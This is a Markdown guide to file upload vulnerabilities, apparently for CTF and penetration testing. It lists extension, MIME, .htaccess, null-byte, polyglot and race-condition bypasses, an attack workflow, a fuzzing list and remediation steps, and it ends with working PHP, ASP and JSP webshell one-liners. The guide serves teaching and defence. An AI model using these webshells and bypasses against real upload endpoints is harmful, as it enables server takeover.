# File Upload Vulnerability - Skills Guide

## Overview

File upload vulnerability occurs when developers fail to strictly validate and filter uploaded files, allowing attackers to upload executable dynamic script files (webshells).

**Impact**: Attackers can control the entire website or even the server through uploaded malicious files (webshells).

---

## File Upload Process

1. **Client**: User selects file via file picker
2. **Upload Request**: Form packages file data and fields into HTTP request
3. **Server Parse**: Extracts file content and fields (PHP stores in `$_FILES`)
4. **Validation**: Server validates file security
5. **Storage**: Moves file from temp directory to target location
6. **Response**: Server responds with upload result

---

## PHP $_FILES Array

| Key | Description |
|-----|-------------|
| `name` | Original filename from client |
| `type` | MIME type (from Content-Type header, **unreliable**) |
| `size` | File size in bytes |
| `tmp_name` | Temp file path on server |
| `error` | Error code (0 = success) |

### Error Codes

| Value | Constant | Meaning |
|-------|----------|---------|
| 0 | UPLOAD_ERR_OK | No error |
| 1 | UPLOAD_ERR_INI_SIZE | Exceeds php.ini limit |
| 2 | UPLOAD_ERR_FORM_SIZE | Exceeds form MAX_FILE_SIZE |
| 3 | UPLOAD_ERR_PARTIAL | Partial upload |
| 4 | UPLOAD_ERR_NO_FILE | No file uploaded |

---

## Vulnerability Classification

### 1. Direct Upload (No Restriction)
- No validation at all
- Attacker uploads webshell directly

### 2. Conditional Upload (Bypassable)

| Type | Description |
|------|-------------|
| Frontend Only | JS validation, bypass with direct HTTP request |
| Header Check | File header/Magic Number detection bypass |
| Incomplete Filter | Weak extension/MIME filtering |
| Auth Missing | Anonymous upload access |
| Middleware Misconfig | Server parses unexpected extensions |

---

## Common Executable Extensions

### PHP Series
```
.php, .php3, .php4, .php5, .phtml, .pht
```

### ASP Series
```
.asp, .asa, .aspx, .ashx, .cer, .cdx
```

### JSP Series
```
.jsp, .jspx, .jspa, .jsw, .jsv, .jspf
```

### Other
```
.shtml, .htaccess
```

---

## Bypass Techniques

### 1. Frontend JS Bypass
- **Method**: Delete frontend validation code OR
- **Method**: Rename to allowed extension, intercept with Burp, change back

### 2. Content-Type Bypass
- Server checks `$_FILES['file']['type']` (client-provided, unreliable)
- **Method**: Change `Content-Type: application/octet-stream` to `Content-Type: image/jpeg`

### 3. Blacklist Bypass - Alternative Extensions
- Upload `.phtml`, `.php3`, `.php5` instead of `.php`
- Requires Apache config: `AddType application/x-httpd-php .php .phtml .php3 .php5`

### 4. .htaccess Upload
- Upload `.htaccess` to change parsing rules:
```apache
AddType application/x-httpd-php .jpg
```
```apache
<FilesMatch "jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```
- Then upload webshell with `.jpg` extension

### 5. Case Bypass
- Server doesn't normalize case
- **Method**: Upload `.PHP`, `.PhP`, `.pHp`

### 6. Space Bypass
- Server doesn't trim spaces in extension
- **Method**: Upload `shell.php ` (trailing space)
- Windows ignores trailing spaces in filename

### 7. Dot Bypass (Windows)
- Server doesn't remove trailing dots
- **Method**: Upload `shell.php.`
- Windows automatically removes trailing dot, resulting in `shell.php`

### 8. NTFS ADS Bypass (Windows)
- NTFS Alternate Data Streams
- **Method**: Upload `shell.php::$DATA`
- Windows creates `shell.php` with the content

### 9. Double Extension Bypass
- Server only removes one trailing dot
- **Method**: Upload `shell.php. .` or `shell.php..`
- Apache parses right-to-left

### 10. Double Write Bypass
- Server replaces blacklisted extensions with empty string
- **Method**: Upload `shell.pphphp` → becomes `shell.php`

### 11. %00 Null Byte Truncation
- **GET**: `save_path=/upload/shell.php%00`
- **POST**: Need actual null byte (not `%00` string)
- PHP < 5.3.4 vulnerable

### 12. File Header Bypass (Magic Number)
- Server checks first bytes of file
- **Method**: Add valid image header to webshell:
```
GIF89a<?php @eval($_POST['cmd']); ?>
```
- Or create image+PHP polyglot:
```bash
copy pic.jpg /b + shell.php /a shell.jpg
```
- Requires file inclusion to execute

### 13. Image Function Bypass
- `getimagesize()` / `exif_imagetype()` validation
- **Method**: Upload valid image with embedded PHP code
- Requires file inclusion vulnerability

### 14. Secondary Rendering Bypass
- Server re-encodes uploaded images
- **Method**: Find unchanged data regions in rendered image
- Insert PHP code in those regions
- GIF is best for this attack

### 15. Race Condition
- Server saves file before validation
- **Method**: Continuous upload + continuous access
- Use Burp Intruder for concurrent requests

### 16. Apache Parsing Vulnerability
- Apache parses extensions right-to-left
- **Method**: Upload `shell.php.abc` (unknown extension)
- Apache falls back to `.php`

### 17. Array Index Bypass
- PHP array with non-contiguous indices
```php
$file[0] = "shell.php";
$file[2] = "jpg";
// count($file) = 2, $file[1] = NULL
// Extension check fails, saves as shell.php
```

---

## Image Magic Numbers

| Format | Hex | ASCII |
|--------|-----|-------|
| JPEG | `FF D8 FF` | - |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | `%PNG` |
| GIF | `47 49 46 38 37 61` | `GIF87a` |
| GIF | `47 49 46 38 39 61` | `GIF89a` |

---

## Other Vulnerabilities

### Nginx 0.8.3
```
1.jpg%00php → parsed as PHP
```

### PHP-CGI (Nginx/IIS 7+)
```
1.jpg/1.php → parsed as PHP
```

### Apache HTTPD (CVE-2017-15715)
```
shell.php\x0A → parsed as PHP (newline char)
```

---

## Attack Workflow

1. **Identify Upload Interface**
   - Avatar upload, file editor, media upload
   - Check authentication requirements

2. **Capture & Test**
   - Use Burp Suite to capture requests
   - Test direct script upload
   - Analyze error responses

3. **Bypass Validation**
   - Try all bypass techniques systematically
   - Check for frontend/backend validation
   - Test extension, MIME, content checks

4. **Post-Exploitation**
   - Access uploaded file URL
   - Verify code execution
   - Check directory permissions

---

## Extension Fuzzing List

```
.php .php5 .php4 .php3 .php2 .phtml .pht
.pHp .pHp5 .pHp4 .pHp3 .pHp2 .pHtml
.jsp .jspx .jspa .jsw .jsv .jspf .jtml
.jSp .jSpx .jSpa .jSw .jSv .jSpf .jHtml
.asp .aspx .asa .asax .ascx .ashx .asmx .cer
.aSp .aSpx .aSa .aSax .aScx .aShx .aSmx .cEr
.shtml .htaccess .swf .sWf
```

---

## Remediation

1. **Access Control**: Require authentication for upload
2. **Directory Permissions**: Disable script execution in upload directory
3. **Whitelist**: Only allow specific extensions
4. **Content Validation**: Check file magic numbers, not just extension
5. **Rename Files**: Use random names, remove original extension
6. **Size Limits**: Prevent DoS via large files
7. **Logging**: Record all upload attempts
8. **Virus Scan**: Scan uploaded files for malware

---

## Quick Reference for CTF

| Check Type | Bypass Method |
|------------|---------------|
| Frontend JS | Burp intercept, modify extension |
| Content-Type | Change to `image/jpeg` |
| Blacklist | Alternative extensions (.phtml) |
| Case sensitive | `.PHP`, `.PhP` |
| Trimming | Space, dot at end |
| Windows | `::$DATA`, double dot |
| Double write | `.pphphp` |
| File header | Add `GIF89a` prefix |
| Image check | Image polyglot + file inclusion |
| Rendering | Find unchanged bytes in GIF |
| Race condition | Concurrent upload + access |
| Path control | `%00` truncation |
| Array | Non-contiguous indices |

---

## Webshell Examples

### PHP
```php
<?php @eval($_POST['cmd']); ?>
<?php system($_GET['c']); ?>
```

### ASP
```asp
<%eval request("cmd")%>
```

### JSP
```jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```
